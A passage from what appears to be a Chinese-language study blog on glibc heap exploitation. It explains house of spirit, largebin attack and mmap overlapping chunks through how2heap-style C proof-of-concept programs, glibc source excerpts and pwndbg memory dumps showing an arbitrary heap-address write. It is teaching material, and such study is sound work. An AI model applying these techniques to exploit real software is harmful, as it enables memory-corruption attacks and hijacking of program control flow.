<h3 id="适用范围-7"><a href="#适用范围-7" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
<li>可以分配任意大小的 <code>chunk</code></li>
</ul>
<h3 id="利用原理-7"><a href="#利用原理-7" class="headerlink" title="利用原理"></a>利用原理</h3><p>主要利用的是：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> heap_for_ptr(ptr) \</span></span><br><span class="line"><span class="meta">  ((heap_info *) ((unsigned long) (ptr) &amp; ~(HEAP_MAX_SIZE - 1)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> arena_for_chunk(ptr) \</span></span><br><span class="line"><span class="meta">  (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)-&gt;ar_ptr : &amp;main_arena)</span></span><br></pre></td></tr></table></figure>

<p>如果是 <code>non-mainarean</code> 的 <code>chunk</code>，会根据其地址找到 <code>heapinfo</code>，然后找到 <code>malloc_state</code> 结构体。</p>
<p>因此，利用技巧是：</p>
<ul>
<li>根据要释放的 <code>fastbin chunk A</code> 的堆地址，找到对应的 <code>heap_for_ptr</code> 地址</li>
<li>在 <code>heapinfo</code> 地址处伪造好相关变量，重点是 <code>mstate</code> 指针</li>
<li>修改 <code>chunk A</code> 的 <code>non-main</code> 标志位，释放到伪造的 <code>arena</code> 里面，控制好偏移即可</li>
</ul>
<h3 id="相关技巧-7"><a href="#相关技巧-7" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul>
<li>一般来说，可以分配任意大小的 <code>chunk</code>，还能堆溢出，很多技巧都能用</li>
<li>这个技巧是希望大家关注对于 <code>arena</code> 的攻击</li>
<li>甚至可以直接修改 <code>thread_arena</code> 这个变量</li>
</ul>
<h3 id="利用效果-7"><a href="#利用效果-7" class="headerlink" title="利用效果"></a>利用效果</h3><ul>
<li>任意地址写堆地址</li>
</ul>
<h2 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h2><p>效果：劫持 <code>fastbin/tcachebin</code> 的 <code>fd</code> 之后，可以任意地址分配、任意地址读写</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;This file demonstrates the house of spirit attack.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;This attack adds a non-heap pointer into fastbin, thus leading to (nearly) arbitrary write.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Required primitives: known target address, ability to set up the start/end of the target memory&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\nStep 1: Allocate 7 chunks and free them to fill up tcache&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *chunks[<span class="number">7</span>];</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line">		chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line">		<span class="built_in">free</span>(chunks[i]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\nStep 2: Prepare the fake chunk&quot;</span>);</span><br><span class="line">	<span class="comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span></span><br><span class="line">	<span class="type">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">0x10</span>)));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The target fake chunk is at %p\n&quot;</span>, fake_chunks);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;It contains two chunks. The first starts at %p and the second at %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">9</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end.&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now set the size of the chunk (%p) to 0x40 so malloc will think it is a valid chunk.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">	fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Set the size of the chunk (%p) to 0x1234 so freeing the first chunk can succeed.\n&quot;</span>, &amp;fake_chunks[<span class="number">9</span>]);</span><br><span class="line">	fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\nStep 3: Free the first fake chunk&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Note that the address of the fake chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *victim = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line">	<span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\nStep 4: Take out the fake chunk&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the next calloc will return our fake chunk at %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;malloc can do the trick as well, you just need to do it for 8 times.&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *allocated = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x30</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;malloc(0x30): %p, fake chunk: %p\n&quot;</span>, allocated, victim);</span><br><span class="line"></span><br><span class="line">	assert(allocated == victim);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞成因-8"><a href="#漏洞成因-8" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出写</p>
<h3 id="适用范围-8"><a href="#适用范围-8" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
</ul>
<h3 id="利用原理-8"><a href="#利用原理-8" class="headerlink" title="利用原理"></a>利用原理</h3><p>利用堆溢出，修改 <code>chunk size</code>，伪造出 <code>fake chunk</code>，然后通过堆的释放和排布，控制 <code>fake chunk</code>。<code>house of spirit</code> 的操作思路有很多，比如可以按如下操作进行利用：</p>
<ul>
<li>申请 <code>chunk A、chunk B、chunk C、chunk D</code></li>
<li>对 <code>A</code> 写操作的时候溢出，修改 <code>B</code> 的 <code>size</code> 域，使其能包括 <code>chunk C</code></li>
<li>释放 <code>B</code>，然后把 <code>B</code> 申请回来，再释放 <code>C</code>，则可以通过读写 <code>B</code> 来控制 <code>C</code> 的内容</li>
</ul>
<h3 id="相关技巧-8"><a href="#相关技巧-8" class="headerlink" title="相关技巧"></a>相关技巧</h3><p>起初 <code>house of spirit</code> 主要是针对 <code>fastbin</code>，后来引入了 <code>tcachebin</code> 后，也可以使用 <code>tcachebin</code> 版本的 <code>house of spirit</code>。利用方法与 <code>fastbin</code> 场景下类似，注意好不同版本下的检查条件即可。</p>
<h3 id="利用效果-8"><a href="#利用效果-8" class="headerlink" title="利用效果"></a>利用效果</h3><ul>
<li>劫持 <code>fastbin/tcachebin</code> 的 <code>fd</code> 之后，可以任意地址分配、任意地址读写</li>
</ul>
<h2 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin_attack"></a>largebin_attack</h2><p>效果：对任意地址写入一个堆地址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">A revisit to large bin attack for after glibc2.30</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Relevant code snippet (有关代码片段):</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))&#123;</span></span><br><span class="line"><span class="comment">		fwd = bck;</span></span><br><span class="line"><span class="comment">		bck = bck-&gt;bk;</span></span><br><span class="line"><span class="comment">		victim-&gt;fd_nextsize = fwd-&gt;fd;</span></span><br><span class="line"><span class="comment">		victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span></span><br><span class="line"><span class="comment">		fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="comment">/*Disable IO buffering to prevent stream from interfering with heap*/</span></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc2.30, two new checks have been enforced(zhi&#x27;x) on large bin chunk insertion\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 1 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (nextsize)\&quot;);\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 2 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (bck-&gt;fd != fwd)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (bk)\&quot;);\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This prevents the traditional large bin attack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> target = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Here is the target we want to overwrite (%p) : %lu\n\n&quot;</span>,&amp;target,target);</span><br><span class="line">  <span class="type">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;First, we allocate a large chunk [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="type">size_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;And another chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We also allocate a second large chunk [p2]  (%p).\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This chunk should be smaller than [p1] and belong to the same large bin.\n&quot;</span>);</span><br><span class="line">  <span class="type">size_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Once again, allocate a guard chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the larger of the two --&gt; [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="type">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the smaller of the two --&gt; [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;At this point, we have one chunk in large bin [p1] (%p),\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;               and one chunk in unsorted bin [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p1[<span class="number">3</span>] = (<span class="type">size_t</span>)((&amp;target)<span class="number">-4</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n&quot;</span>,(&amp;target)<span class="number">-4</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n&quot;</span>, p2<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;  the modified p1-&gt;bk_nextsize does not trigger any error\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Upon inserting [p2] (%p) into largebin, [p1](%p)-&gt;bk_nextsize-&gt;fd_nextsize is overwritten to address of [p2] (%p)\n&quot;</span>, p2<span class="number">-2</span>, p1<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;In our case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n&quot;</span>, p2<span class="number">-2</span>, (<span class="type">void</span> *)target);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Target (%p) : %p\n&quot;</span>,&amp;target,(<span class="type">size_t</span>*)target);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  assert((<span class="type">size_t</span>)(p2<span class="number">-2</span>) == target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>新版largebin_attack利用的源代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)</span><br><span class="line">		      &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line">					  <span class="comment">//将victim链入nextsize链表</span></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;<span class="comment">//设置 victim 的 fd_nextsize，为p2 headptr</span></span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      <span class="comment">//设置 victim 的bk_nextsize，为p2 headptr</span></span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                      <span class="comment">//设置 p1 的fd_nextsize 和 bk_nextsize</span></span><br><span class="line">					  <span class="comment">/*引用到原代码中，示例如下：*/</span></span><br><span class="line">                      &amp;p2-&gt;fd_nextsize = &amp;p1-&gt;fd;</span><br><span class="line">                      &amp;p2-&gt;bk_nextsize = &amp;p1-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      &amp;p1-&gt;fd-&gt;bk_nextsize = &amp;p2-&gt;bk_nextsize-&gt;fd_nextsize = &amp;p2;</span><br></pre></td></tr></table></figure>


<p>首先是程序申请了4个堆块分别为0x428、0x18、0x418、0x18</p>
<p>申请的g1和g2是为了防止两个比较大的堆块合并.</p>
<p>再往后释放了p1堆块，到unsorted bin中</p>
<p>之后有分配了一个比p1大的堆块使得p1堆块能够进入largebin中</p>
<p>改 p1-&gt;bk_nextsize 为target-0x20</p>
<p>然后程序free p2堆块进入到unsorted bin中</p>
<p><strong>此时就造成了unsortedbin中有一个largebinchunk，再次分配一个比bins中都大的chunk时p2会被放入largebin，触发漏洞</strong><br><strong>调试：</strong></p>
<p><code>&amp;target = 0x7fffffffe470</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">empty</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">0x400-0x430: 0x555555559290 —▸ 0x7ffff7fbbfd0 (main_arena+1104) ◂— 0x555555559290</span><br><span class="line">pwndbg&gt; x/10gx 0x5555555596e0 <span class="comment"># p2</span></span><br><span class="line">0x5555555596e0: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x5555555596f0: 0x00007ffff7fbbbe0      0x00007ffff7fbbbe0</span><br><span class="line">0x555555559700: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559710: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559720: 0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/10gx 0x555555559290 <span class="comment"># p1</span></span><br><span class="line">0x555555559290: 0x0000000000000000      0x0000000000000431</span><br><span class="line">0x5555555592a0: 0x00007ffff7fbbfd0      0x00007ffff7fbbfd0</span><br><span class="line">0x5555555592b0: 0x0000555555559290      0x00007fffffffe450</span><br><span class="line">0x5555555592c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555592d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>执行过victim-&gt;fd_nextsize &#x3D; fwd-&gt;fd;后 p2</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x5555555596e0</span><br><span class="line">0x5555555596e0: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x5555555596f0: 0x00007ffff7fbbbe0      0x00007ffff7fbbbe0</span><br><span class="line">0x555555559700: 0x0000555555559290      0x0000000000000000</span><br><span class="line">0x555555559710: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>执行过victim-&gt;bk_nextsize &#x3D; fwd-&gt;fd-&gt;bk_nextsize;后 p2</p>
<blockquote>
<p>这里可以注意到：fwd-&gt;fd 是 0x0000555555559290，即fwd是p1的mem指针，victim是p2的head指针</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x5555555596e0</span><br><span class="line">0x5555555596e0: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x5555555596f0: 0x00007ffff7fbbbe0      0x00007ffff7fbbbe0</span><br><span class="line">0x555555559700: 0x0000555555559290      0x00007fffffffe450</span><br><span class="line">0x555555559710: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>执行过&amp;p1-&gt;fd-&gt;bk_nextsize &#x3D; &amp;p2-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; &p2;后target就被写入了 p2 的地址</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x5555555596e0</span><br><span class="line">0x5555555596e0: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x5555555596f0: 0x00007ffff7fbbbe0      0x00007ffff7fbbbe0</span><br><span class="line">0x555555559700: 0x0000555555559290      0x00007fffffffe450</span><br><span class="line">0x555555559710: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559720: 0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/10gx 0x555555559290</span><br><span class="line">0x555555559290: 0x0000000000000000      0x0000000000000431</span><br><span class="line">0x5555555592a0: 0x00007ffff7fbbfd0      0x00007ffff7fbbfd0</span><br><span class="line">0x5555555592b0: 0x0000555555559290      0x00005555555596e0</span><br><span class="line">0x5555555592c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555592d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/10gx 0x7fffffffe470-0x20</span><br><span class="line">0x7fffffffe450: 0x0000555555555610      0x00007fffffffe4b0</span><br><span class="line">0x7fffffffe460: 0x0000555555555140      0x00005555555554e7</span><br><span class="line">0x7fffffffe470: 0x00005555555596e0&lt;--target     0x00005555555592a0</span><br><span class="line">0x7fffffffe480: 0x00005555555596d0      0x00005555555596f0</span><br><span class="line">0x7fffffffe490: 0x0000555555559b10      0x0000555555559b30</span><br></pre></td></tr></table></figure>

<p>其实，这三行置零最重要的是最后一行的<code>(target-0x20)-&gt;fd_nextsize = victim</code>这就相当于在(target-0x20)+0x20也就是target的地方写下victim也就是p2的地址</p>
<p><strong>利用：</strong></p>
<p>这种写大数的行为，我们可以用来修改global_max_fast,来使程序中分配的堆块都被识别成fastbin，这样来进行一些可以实现的fastbin attack。再恶劣一点的环境来说，我们可以利用其来进行指针的劫持，劫持为我们可控的地方，在可控的地方为造出原本应有的结构体产生劫持程序流的效果（iofile_attack:你直接说我名字得了）。</p>
<h3 id="漏洞成因-9"><a href="#漏洞成因-9" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><h3 id="适用范围-9"><a href="#适用范围-9" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
</ul>
<h3 id="利用原理-9"><a href="#利用原理-9" class="headerlink" title="利用原理"></a>利用原理</h3><h3 id="相关技巧-9"><a href="#相关技巧-9" class="headerlink" title="相关技巧"></a>相关技巧</h3><h3 id="利用效果-9"><a href="#利用效果-9" class="headerlink" title="利用效果"></a>利用效果</h3><h2 id="mmap-overlapping-chunks"><a href="#mmap-overlapping-chunks" class="headerlink" title="mmap_overlapping_chunks"></a>mmap_overlapping_chunks</h2><p>malloc的内存通过vmmap可以查看</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">技术应适用于所有版本的 GLibC</span></span><br><span class="line"><span class="comment">编译命令：`gcc mmap_overlapping_chunks.c -o mmap_overlapping_chunks -g`</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">POC 由 Maxwell Dulin（Strikeout）编写</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	关于 GLibC 中的 Mmap 块的简介</span></span><br><span class="line"><span class="comment">	==================================</span></span><br><span class="line"><span class="comment">	在 GLibC 中，存在一个点，当分配的内存块过大时，malloc 决定需要为其分配一个单独的内存区域，而不是在正常堆上分配。这是由 mmap_threshold 变量决定的。</span></span><br><span class="line"><span class="comment">	此时，使用系统调用 *Mmap* 来分配一段虚拟内存并返回给用户。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	类似地，释放过程也会有所不同。释放的块不会被返回给一个 bin 或堆的其余部分，而是使用另一个系统调用：*Munmap*。这个调用接受一个指向之前分配的 Mmap 块的指针，并将其释放回内核。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Mmap 块在大小元数据上设置了特殊的位：第二位。如果该位被设置，则表示该块是作为 Mmap 块分配的。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Mmap 块有 prev_size 和 size。*size* 表示块的当前大小。块的 *prev_size* 表示 Mmap 块的剩余空间（不是直接下方块的大小）。</span></span><br><span class="line"><span class="comment">	然而，fd 和 bk 指针并未使用，因为 Mmap 块不会回到 bins 中，正如 GLibC Malloc 中的大多数堆块一样。释放时，块的大小必须按照页面对齐。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	下面的 POC 实际上是对 mmap 块的重叠块攻击。这与 https://github.com/shellphish/how2heap/blob/master/glibc_2.26/overlapping_chunks.c 非常相似。</span></span><br><span class="line"><span class="comment">	主要区别在于 mmapped 块具有特殊的属性，并以不同的方式处理，导致与正常重叠块攻击不同的攻击场景。</span></span><br><span class="line"><span class="comment">	还可以执行其他操作，例如 munmapping 系统库、堆本身等。</span></span><br><span class="line"><span class="comment">	这只是一个简单的概念验证，旨在演示对 mmap 块进行攻击的一般方式。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	有关 GLibC 中 mmap 块的更多信息，请阅读这篇文章：</span></span><br><span class="line"><span class="comment">	http://tukan.farm/2016/07/27/munmap-madness/</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="type">int</span>* ptr1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>); </span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This is performing an overlapping chunk attack but on extremely large chunks (mmap chunks).\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Extremely large chunks are special because they are allocated in their own 